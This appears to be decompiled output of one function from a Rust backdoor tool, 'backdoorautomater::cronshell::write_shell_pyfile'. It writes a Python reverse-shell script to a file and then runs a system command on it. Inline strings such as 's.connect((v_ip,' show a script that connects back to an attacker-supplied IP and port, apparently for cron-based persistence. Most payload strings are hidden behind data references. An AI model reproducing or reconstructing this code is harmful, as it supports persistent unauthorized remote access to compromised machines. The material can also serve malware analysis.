long _ZN17backdoorautomater9cronshell18write_shell_pyfile17hd91b0663228d4b31E
               (long param_1,long param_2,long param_3)

{
  long lVar1;
  undefined8 uVar2;
  int local_1ec;
  undefined4 local_1e8;
  undefined4 uStack_1e4;
  undefined4 uStack_1e0;
  undefined4 uStack_1dc;
  undefined8 local_1d8;
  undefined4 local_1c8;
  undefined4 uStack_1c4;
  undefined4 uStack_1c0;
  undefined4 uStack_1bc;
  undefined8 local_1b8;
  undefined4 local_1a8;
  undefined4 uStack_1a4;
  undefined4 uStack_1a0;
  undefined4 uStack_19c;
  undefined8 local_198;
  undefined4 local_168;
  undefined4 uStack_164;
  undefined4 uStack_160;
  undefined4 uStack_15c;
  undefined8 local_158;
  undefined4 local_148;
  undefined4 uStack_144;
  undefined4 uStack_140;
  undefined4 uStack_13c;
  undefined8 local_138;
  undefined8 local_130;
  undefined8 uStack_128;
  undefined4 local_120;
  undefined4 uStack_11c;
  undefined4 uStack_118;
  undefined4 uStack_114;
  undefined local_60 [32];
  undefined8 local_40;
  undefined8 local_38;
  
                    /* try { // try from 001629b8 to 001629c7 has its CatchHandler @ 00162e95 */
  _ZN3std2fs4File6create17he97042899d0016f9E(&local_130,param_3);
  lVar1 = uStack_128;
  if ((int)local_130 == 0) {
    local_1ec = local_130._4_4_;
                    /* try { // try from 001629ea to 00162a74 has its CatchHandler @ 00162e7d */
    lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E(&local_1ec,&DAT_0026725c,0x1d);
    if ((lVar1 == 0) &&
       (lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E(&local_1ec,&DAT_00267279,0x34),
       lVar1 == 0)) {
      local_120 = *(undefined4 *)(param_2 + 8);
      uStack_11c = *(undefined4 *)(param_2 + 0xc);
      uStack_118 = *(undefined4 *)(param_2 + 0x10);
      uStack_114 = *(undefined4 *)(param_2 + 0x14);
      local_130 = &DAT_002672ad;
      uStack_128 = 6;
      _ZN5alloc3str17join_generic_copy17hc78a65dc4338aaa9E(&local_1a8,&local_130,2,1,0);
      local_1d8 = local_198;
      local_1e8 = local_1a8;
      uStack_1e4 = uStack_1a4;
      uStack_1e0 = uStack_1a0;
      uStack_1dc = uStack_19c;
                    /* try { // try from 00162a89 to 00162b04 has its CatchHandler @ 00162e6e */
      _ZN5alloc3vec16Vec_LT_T_C_A_GT_17extend_from_slice17h3cce9f7974121c70E
                (&local_1e8,&DAT_00267259,3);
      lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E
                        (&local_1ec,CONCAT44(uStack_1dc,uStack_1e0),local_1d8);
      if (lVar1 == 0) {
        local_120 = *(undefined4 *)(param_1 + 8);
        uStack_11c = *(undefined4 *)(param_1 + 0xc);
        uStack_118 = *(undefined4 *)(param_1 + 0x10);
        uStack_114 = *(undefined4 *)(param_1 + 0x14);
        local_130 = "s.connect((v_ip,";
        uStack_128 = 0x10;
        _ZN5alloc3str17join_generic_copy17hc78a65dc4338aaa9E(&local_1a8,&local_130,2,1,0);
        local_1b8 = local_198;
        local_1c8 = local_1a8;
        uStack_1c4 = uStack_1a4;
        uStack_1c0 = uStack_1a0;
        uStack_1bc = uStack_19c;
                    /* try { // try from 00162b19 to 00162bfe has its CatchHandler @ 00162e5f */
        _ZN5alloc3vec16Vec_LT_T_C_A_GT_17extend_from_slice17h3cce9f7974121c70E
                  (&local_1c8,&DAT_00265a9f,4);
        lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E
                          (&local_1ec,CONCAT44(uStack_1bc,uStack_1c0),local_1b8);
        if ((((lVar1 == 0) &&
             (lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E(&local_1ec,&DAT_002672b3,0x17),
             lVar1 == 0)) &&
            (lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E(&local_1ec,&DAT_002672ca,0x17),
            lVar1 == 0)) &&
           (((lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E(&local_1ec,&DAT_002672e1,0x17),
             lVar1 == 0 &&
             (lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E(&local_1ec,&DAT_002672f8,0x1e),
             lVar1 == 0)) &&
            ((lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E(&local_1ec,&DAT_00267316,0x14),
             lVar1 == 0 &&
             (lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E(&local_1ec,&DAT_0026732a,0x31),
             lVar1 == 0)))))) {
          local_120 = *(undefined4 *)(param_3 + 8);
          uStack_11c = *(undefined4 *)(param_3 + 0xc);
          uStack_118 = *(undefined4 *)(param_3 + 0x10);
          uStack_114 = *(undefined4 *)(param_3 + 0x14);
          local_130 = &DAT_0026735b;
          uStack_128 = 10;
                    /* try { // try from 00162c77 to 00162c95 has its CatchHandler @ 00162e5f */
          _ZN5alloc3str17join_generic_copy17hc78a65dc4338aaa9E(&local_1a8,&local_130,2,1,0);
          local_158 = local_198;
          local_168 = local_1a8;
          uStack_164 = uStack_1a4;
          uStack_160 = uStack_1a0;
          uStack_15c = uStack_19c;
                    /* try { // try from 00162cb0 to 00162cc8 has its CatchHandler @ 00162e03 */
          _ZN3std7process7Command3new17hc59b10cf3f1b2adaE(&local_130,&DAT_00267183,2);
                    /* try { // try from 00162ccc to 00162d38 has its CatchHandler @ 00162e3b */
          uVar2 = _ZN3std7process7Command3arg17ha1bca970e684ecbeE(&local_130,&DAT_00267185,2);
          local_198 = local_158;
          local_1a8 = local_168;
          uStack_1a4 = uStack_164;
          uStack_1a0 = uStack_160;
          uStack_19c = uStack_15c;
          uVar2 = _ZN3std7process7Command3arg17hc1c88ee68029addcE(uVar2,&local_1a8);
          (*(code *)PTR__ZN3std7process7Command6output17hf2f7777b705db8a9E_00368e98)
                    (&local_1a8,uVar2);
          _ZN4core6result19Result_LT_T_C_E_GT_6expect17h4dac3b1149b99667E
                    (local_60,&local_1a8,&PTR_s_src_cronshell_rs_0032a968);
                    /* try { // try from 00162d39 to 00162d60 has its CatchHandler @ 00162e29 */
          _ZN4core3ptr42drop_in_place_LT_std__process__Command_GT_17h60da061aa1df0d14E(&local_130);
          (*(code *)PTR__ZN5alloc6string6String15from_utf8_lossy17h7ed9087fa43d10adE_00368300)
                    (&local_1a8,local_40,local_38);
                    /* try { // try from 00162d61 to 00162d7a has its CatchHandler @ 00162e1a */
          uVar2 = _ZN71__LT_alloc__borrow__Cow_LT_B_GT__u20_as_u20_core__ops__deref__Deref_GT_5deref17ha2c16a4b1cc76445E
                            (&local_1a8);
          _ZN52__LT_T_u20_as_u20_alloc__slice__hack__ConvertVec_GT_6to_vec17h4aa1dd8ab670f689E
                    (&local_130,uVar2);
          local_138 = CONCAT44(uStack_11c,local_120);
          local_148 = (int)local_130;
          uStack_144 = local_130._4_4_;
          uStack_140 = (undefined4)uStack_128;
          uStack_13c = uStack_128._4_4_;
                    /* try { // try from 00162d9b to 00162db1 has its CatchHandler @ 00162e08 */
          _ZN4core3ptr50drop_in_place_LT_alloc__borrow__Cow_LT_str_GT__GT_17hb5385058f177b775E
                    (&local_1a8);
          _ZN17backdoorautomater9sanitizer23sanitize_system_command17hc9c6071c8b9b108cE(&local_148);
                    /* try { // try from 00162db2 to 00162dbe has its CatchHandler @ 00162e29 */
          _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_148);
                    /* try { // try from 00162dbf to 00162dcb has its CatchHandler @ 00162e01 */
          _ZN4core3ptr41drop_in_place_LT_std__process__Output_GT_17h78d1e539beaf0e46E(local_60);
                    /* try { // try from 00162dcc to 00162dd5 has its CatchHandler @ 00162e6e */
          _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_1c8);
                    /* try { // try from 00162dd6 to 00162ddf has its CatchHandler @ 00162e7d */
          _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_1e8);
                    /* try { // try from 00162de4 to 00162de8 has its CatchHandler @ 00162e95 */
          _ZN4core3ptr34drop_in_place_LT_std__fs__File_GT_17hb99078073e1bf56bE(local_1ec);
                    /* try { // try from 00162de9 to 00162df0 has its CatchHandler @ 00162e90 */
          _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(param_3);
                    /* try { // try from 00162df1 to 00162df8 has its CatchHandler @ 00162e8b */
          _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(param_2);
          lVar1 = 0;
          goto LAB_00162c34;
        }
                    /* try { // try from 00162c07 to 00162c10 has its CatchHandler @ 00162e6e */
        _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_1c8);
      }
                    /* try { // try from 00162c11 to 00162c1a has its CatchHandler @ 00162e7d */
      _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_1e8);
    }
                    /* try { // try from 00162c1f to 00162c23 has its CatchHandler @ 00162e95 */
    _ZN4core3ptr34drop_in_place_LT_std__fs__File_GT_17hb99078073e1bf56bE(local_1ec);
  }
                    /* try { // try from 00162c24 to 00162c2b has its CatchHandler @ 00162e90 */
  _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(param_3);
                    /* try { // try from 00162c2c to 00162c33 has its CatchHandler @ 00162e8b */
  _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(param_2);
LAB_00162c34:
  _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(param_1);
  return lVar1;
}